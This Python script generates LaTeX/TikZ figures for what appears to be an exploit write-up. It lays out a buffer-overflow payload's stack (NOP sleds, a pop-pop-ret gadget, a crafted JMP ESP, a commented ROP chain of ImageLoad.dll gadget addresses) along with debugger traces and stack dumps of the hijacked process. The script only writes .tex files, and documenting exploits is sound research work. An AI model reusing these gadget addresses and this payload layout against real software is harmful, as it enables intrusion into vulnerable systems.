import os

OUTPUT_PATH="input"

stack_base = \
"""
\\begin{{figure}}[!h]
  \\centering
  \\begin{{tikzpicture}}
{}
  \\end{{tikzpicture}}
  \\caption{{Representation of the stack created by the payload.}}
\\end{{figure}}
"""

def tt(text):
    return "\\texttt{{{}}}".format(text)

def vdots():
    return "\\vdots"


elements =  [
    "90 x NOP",
    "0x1001D8C8 ; call\_edx",
    "280 x NOP",
    "0x10010101 ; ppr",
    "0xA445ABCF ; crafted\_jmp\_esp" ,
    "0x10010125 ; kungfu",
    "0x10022aac ; kungfu", # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll]
    "0xDEADBEEF ; kungfu", # filler
    "0xDEADBEEF ; kungfu", # filler
    "0x1001a187 ; kungfu", # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
    "0x1002466d ; kungfu", # PUSH EAX # RETN [ImageLoad.dll]
    "90 x NOP",
    "shellcode",
]

exploit_instructions = [l.strip() for l in """
00468702 000006E0 *CALL DWORD PTR DS:[EDX+28]
1001D87A 000006E0 MOV EDI,DWORD PTR SS:[ESP+264]
1001D881 000006E0 MOV BL,BYTE PTR DS:[EDI]
1001D883 000006E0 INC EDI
1001D884 000006E0 TEST BL,BL
1001D886 000006E0 MOV BYTE PTR SS:[ESP+40],BL
1001D88A 000006E0 MOV DWORD PTR SS:[ESP+264],EDI
1001D891 000006E0 JNZ ImageLoa.1001D075
1001D897 000006E0 MOV EAX,DWORD PTR SS:[ESP+1C]
1001D89B 000006E0 POP EDI
1001D89C 000006E0 POP ESI
1001D89D 000006E0 POP EBP
1001D89E 000006E0 POP EBX
1001D89F 000006E0 *ADD ESP,24C
1001D8A5 000006E0 *RETN
10010101 000006E0 *POP EBX
10010102 000006E0 *POP ECX
10010103 000006E0 *RETN
10022AAC 000006E0 *MOV EAX,EBX
10022AAE 000006E0 POP ESI
10022AAF 000006E0 POP EBX
10022AB0 000006E0 *RETN
1001A187 000006E0 *ADD EAX,5BFFC883
1001A18C 000006E0 *RETN
1002466D 000006E0 *PUSH EAX
1002466E 000006E0 *RETN
00457452 000006E0 *JMP ESP
03B69A0C 000006E0 NOP
03B69A0C 000006E0 \\vdots
""".splitlines() if l.strip()]

stack_after_payload = \
"""ESP+F0   > 90909090
\\vdots
ESP+13C  > 90909090
ESP+140  > 1001D8C8  ImageLoa.1001D8C8
ESP+224  > 90909090
\\vdots
ESP+258  > 90909090
ESP+25C  > 10010101  ImageLoa.10010101
ESP+260  > A445ABCF
ESP+264  > 10010125  ImageLoa.10010125
ESP+268  > 10022AAC  ImageLoa.10022AAC
ESP+26C  > DEADBEEF
ESP+270  > DEADBEEF
ESP+274  > 1001A187  ImageLoa.1001A187
ESP+278  > 1002466D  ImageLoa.1002466D
ESP+27C  > 90909090
\\vdots
ESP+28C  > 90909090
ESP+290  > FDBBCADA
\\vdots""".splitlines()

stack_before_payload = \
"""ESP+F0   > 00000000
\\vdots
ESP+194  > 00000000
ESP+198  > 01000101
ESP+19C  > 024C3088
ESP+1A0  > 005829F8  fmws.005829F8
ESP+1A4  > 005829F8  fmws.005829F8
ESP+1A8  > 00554474  fmws.00554474
ESP+1AC  > 00000668
ESP+1B0  > 00000001
ESP+1B4  > 024C3178
ESP+1B8  > 4244794D
ESP+1BC  > 706F432C
ESP+1C0  > 67697279
ESP+1C4  > 475F7468
ESP+1C8  > 6E6F4875
ESP+1CC  > 00000067
ESP+1D0  > 00000000
ESP+1D4  > 00000000
ESP+1D8  > 00000228
ESP+1DC  > 00000003
ESP+1E0  > 00006469
ESP+1E4  > 00000000
\\vdots
ESP+1E8  > 00000000
ESP+200  > 656D616E
ESP+204  > 00000000
\\vdots
ESP+21C  > 00000000
ESP+220  > 68746170
ESP+224  > 00000000
\\vdots
ESP+23C  > 00000000
ESP+240  > 63736544
ESP+244  > 74706972
ESP+248  > 006E6F69
ESP+24C  > 00000000
\\vdots
ESP+25C  > 00000000
ESP+260  > 65636361
ESP+264  > 00007373
ESP+268  > 00000000
\\vdots
ESP+27C  > 00000000
ESP+280  > 61736964
ESP+284  > 00656C62
ESP+288  > 00000000
ESP+28C  > 00000000
ESP+290  > 00000000""".splitlines()


current_x = 0.0
current_y = 0.0

rect_width = 3.0
rect_height = 0.5
comment_offset = 0.5

internal_code_buffer = []

fmt_draw_rect = "    \\draw ({:.4},{:.4}) rectangle ({:.4},{:.4});"
fmt_text_node = "    \\node at ({:.4},{:.4}) {{{}}};"
fmt_text_node_comment = "    \\node[anchor=west] at ({:.4},{:.4}) {{{}}};"

for elem in reversed(elements):

    x1 = current_x
    y1 = current_y
    x2 = x1+rect_width
    y2 = y1+rect_height

    internal_code_buffer.append(fmt_draw_rect.format(x1,y1,x2,y2))

    tx = (x2-x1)/2
    ty = current_y+((y2-y1)/2)

    comment=""
    if ';' in elem: # Comment present.
        elem, comment = [e.strip() for e in elem.split(';')]

    code = fmt_text_node.format(tx, ty, tt(elem))
    internal_code_buffer.append(code)

    if comment:
        cx = tx + rect_width/2 + comment_offset
        cy = ty
        comment = fmt_text_node_comment.format(cx, cy, "; "+comment)
        internal_code_buffer.append(comment)

    current_y += rect_height

if not os.path.isdir(OUTPUT_PATH):
    os.mkdir(OUTPUT_PATH)

def write_list(fp, line_list):
    fp.write('\n'.join(line_list)+"\n")

splits = 3
lines = ["\\texttt{{{}}}\\\\".format(line) for line in
        stack_before_payload]
split_len = int(len(lines)/splits)
for i in range(splits):
    line_segment = lines[i*split_len:(i+1)*split_len]
    with open(os.path.join(OUTPUT_PATH, 'stack_before_{}.tex'.format(i)), 'w') as fp:
        write_list(fp, line_segment)

with open(os.path.join(OUTPUT_PATH, 'stack_after.tex'), 'w') as fp:
    lines = ["\\hspace*{{3cm}}\\texttt{{{}}}\\\\".format(line) for line in stack_after_payload]
    write_list(fp, lines)

base_command_listing = """
{}
"""
def color(text):
    return "\\colorbox{{blue!30}}{{{}}}".format(text)

line_buffer = []
for index, line in enumerate(exploit_instructions):
    adress, _, *command_tokens = line.split()
    command = ' '.join(command_tokens)
    command=tt(command)
    if '*' in command:
        command = command.replace('*','')
        command = color(command)
    line_buffer.append("\\hspace*{3.0cm}"+"{:02d}: ".format(index)+command+"\\\\")

with open(os.path.join(OUTPUT_PATH, 'command_selection.tex'), 'w') as fp:
    fp.write(base_command_listing.format('\n'.join(line_buffer))+"\n")
